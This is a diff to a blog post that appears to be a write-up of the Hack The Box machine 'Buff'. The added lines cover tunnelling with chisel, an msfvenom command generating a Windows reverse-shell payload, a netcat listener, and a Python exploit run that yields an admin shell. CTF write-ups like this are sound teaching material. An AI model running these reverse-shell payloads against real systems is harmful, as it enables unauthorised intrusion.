@@ -7,10 +7,10 @@ published: true
 
 ## Content
 1. [Introduction](#introduction)
-1. [Enumertion](#enumeration)
-1. [FootHold](#foothold)
-1. [Lateral Movement](#getting-proper-shell)
-1. [Priv Esc](#priv-esc)
+2. [Enumertion](#enumeration)
+3. [FootHold](#foothold)
+4. [Lateral Movement](#getting-proper-shell)
+5. [Privilege Escalation](#privilege-escilation)
 
 ## Introduction
 
@@ -54,7 +54,7 @@ when it is connected we have to send request with HEAD method to to get the bann
 
 `HEAD / HTTP/1.1`
 
-`Host: 10.10.10.198` and press enter
+`Host: 10.10.10.198`
 
 You will get output like the image.
 
@@ -187,7 +187,9 @@ Here we can see that the machine is listening in port 8888. So that means that w
 
 Now what to do we cannot connect it from outside and there is no python in machine so how to send payload to port 8888 and get the shell...
 
-The answer is TCP-Tunneling or Port-Forwarding. I simple word port forwarding redirects a request from one ipaddress and port to another ip address and port. You can learn more about port forwarding and tunneling [here](https://book.hacktricks.xyz/tunneling-and-port-forwarding) and [here](https://support.anydesk.com/TCP-Tunneling#:~:text=TCP%2DTunneling%20(or%20Port%20Forwarding,Linux%20platforms%20since%20version%205.1.)
+The answer is TCP-Tunneling or Port-Forwarding. In simple word port forwarding redirects a request from one ipaddress and port to another ip address and port. You can learn more about port forwarding and tunneling [here](https://book.hacktricks.xyz/tunneling-and-port-forwarding) and [here](https://support.anydesk.com/TCP-Tunneling)
+
+### TCP-Tunneling
 
 To perform TCP-Tunneling i'll use `chisel`. You can download it from [here](https://github.com/jpillora/chisel). You can also use `plink` if you want. I use chisel because why not ;-). So let's download chisel executable for linux and windows from releases.
 
@@ -213,3 +215,40 @@ Now go to vulnerable machine and type the following command inside the `C:\xampp
 
 > **NOTE** : In the above image i am using powershell
 
+### Creting Payload
+
+Now's Let's create out shellcode to get a reverse shell in out machine. To create our shellcode we are going to use msfvenom. If you don't know about msfvenom [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) is the link. In short msfvenom is a tool use to make shellcodes. So let's create out payload 
+
+Enter the following command in your machine
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP Address> LPORT=4444`
+
+```
+ -p     :  it specifies the type of payload we are creating
+ LHOST  :  Our Machine IP Address
+ LPORT  :  Port Number in which connection will be stablished
+```
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/msfvenom.png)
+
+Now copy the shellcode in out python exploit script as shown below
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cloudexploit.png)
+
+Let's set up a litener to port `4444` using NetCat for incoming reverse shell.
+
+`nv -nvlp 4444`
+
+Now Moment of truth. We are going to execute the script and our script is going to connect to port 8888 and send payload there, Now because of TCP-tunneling our payload should be redirected to the vulnerable machine and execute out payload. Let's execute the script and see what happends.
+
+`python cloudexploit.py`
+
+Anddd... Boom! We get a root shell.
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/rootshell.png)
+
+> **NOTE** : If the exploit doesn't word execute it multiple time.
+
+Thanks for reading this post. If you think that something is missing or you didn't get it please feel free to email ne at `cyber.antiru@gmail.com`.
+
+So Keep Hacking and see you in another post.
